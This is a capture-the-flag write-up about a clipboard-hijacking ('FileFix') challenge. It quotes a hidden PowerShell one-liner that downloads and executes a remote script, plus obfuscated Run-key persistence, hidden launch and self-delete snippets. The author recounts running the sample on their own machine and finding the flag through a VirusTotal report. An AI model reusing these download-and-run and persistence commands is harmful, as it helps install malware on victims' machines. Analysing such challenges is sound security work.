# Challenge Description

> Rumors whisper of a shadow moving beneath the Silver Moon.
Investigate the strange occurrences and reveal the demon’s hidden technique before it’s too late
>
> WARNING: Do not run the malware file on your PC.
https://powershell.wwctf.com/ 

# Overview

Let's start by looking at what the site does. We can directly see that when we click on the file path as requested, it modifies our clipboard by discreetly adding a PowerShell script.

```js
powershell -ep bypass -w hidden IEX(New-ObjEct System.Net.Webclient).Downloadstring('https://powershell.wwctf.com/update.ps1')                                                                    
```

# Who could be stupid enough to launch it by accident?

**I launched it**. Few seconds after the challenge was published. And it took a few seconds before I realized what I had just done... The PowerShell script was huge as fuck *(19Mo)*, it even crashed my VSCode instantly at the first opening...

<div align="center">
	<p><b>me during the challenge:</b></p>
  <img src="https://imgur.com/4ccuSDG.png" width="300">
</div>

This PowerShell Script will create an ``update.exe`` in ``$env:USERPROFILE\Documents\J1Csum3Dcj``, it will add persistence by launching it at user login. It will then launch the executable and then delete it from the folder. What could go wrong with running this on my computer without checking?

### Persistence
```ps
Set-ItemProperty -Path ((("{8}{2}{5}{1}{0}{6}{3}{7}{4}"-f'ows{0}C','d','oftwar','rr','Version{0}Run','e{0}Microsoft{0}Win','u','ent','HKCU:{0}S'))  -F[char]92) -Name ("{2}{0}{1}"-f 'Ao','prv','l') -Value "$env:USERPROFILE\Documents\J1Csum3Dcj\update.exe"
```

### Launch the malware
```ps
$ws=New-Object -ComObject WScript.Shell;$ws.Run($EHPoSQvgWxy,0,$false)
```

### Delete the malware
```ps
Remove-Item $MyInvocation.MyCommand.Path -Force
```

# VirusTotal

Just to be extra sure about what I had just done, I decided to remove the part that deletes ``update.exe`` and upload the file to VirusTotal. You know… just to be sure.

<div align="center">
  <img src="https://imgur.com/6QsRV0c.png">
</div>

In French, we'd say I was *["chokbar"](https://dictionnaire.orthodidacte.com/article/definition-chokbar-de-bz)*. So I basically ran, on my own machine, a program that's flagged as malicious by more than 50% of [antivirus engines](https://www.virustotal.com/gui/file/88d8aa69350b8516857c2fee3de800dc7e8afefd5660f27d3fadde51c349fdac/behavior)?

![https://imgur.com/EyETDJ9.png](https://imgur.com/EyETDJ9.png)

# Analysis

In the VirusTotal report, you can see the program communicate to two local IPs: ``192.168.100.157`` on port ``8080``, and ``192.168.75.130`` on port ``443``. But I mean... why bother analyzing the traffic in a safe environment when the malware’s already chilling on my machine, right?

So yeah, I just kept running the damn thing to see what else it would do. Unfortunately, I was not able to capture the flag due to encrypted traffic. Then Windows Defender suddenly woke up and started blocking the program, so I put the program in a .7z and uploaded it to VirusTotal again. The program was still flagged as malicious. But this time, we got some new info on what it was doing.

# Finding the flag

In the **Memory Pattern Urls** section, we can see a lot of URLs that the program tries to access. In the list, we can see a URL that looks interesting: ``https://192.168.75.130?flag=d3dme2YxbDNmMXhfdDBfc2wxdjNyX2IzNGMwbn0=``.

**Wait a sec. That looks like a flag. Let’s decode it with base64.**
```bash
┌─[raphckrman@raphckrman]─[~]
└──╼ $echo "d3dme2YxbDNmMXhfdDBfc2wxdjNyX2IzNGMwbn0=" | base64 --decode
wwf{f1l3f1x_t0_sl1v3r_b34c0n}
```

Boom. Got it. I don't think this is the intended way to solve the challenge, but I mean... it works, right, a flag is a flag ?
<div align="center">
  <img src="https://imgur.com/UxYviGT.png" width="400">
</div>

# Is this the intended way to solve the challenge?

No, not at all. Besides, after I solved the challenge, the creator of the challenge, @serioton, reached out to me to discuss my approach. We had a fun conversation about the challenge and its intended solution.

![https://imgur.com/r8IeKnR.png](https://imgur.com/r8IeKnR.png)

I knew it was weird I got the flag so easy, like 30 minutes after the challenge went live. The creator’s totally confused about how VirusTotal spotted the flag with that encryption layer in the way…

![https://imgur.com/O1zRvh3.png](https://imgur.com/O1zRvh3.png)
<div align="center">
  <img src="https://imgur.com/O4CKYvZ.png" width="400">
</div>
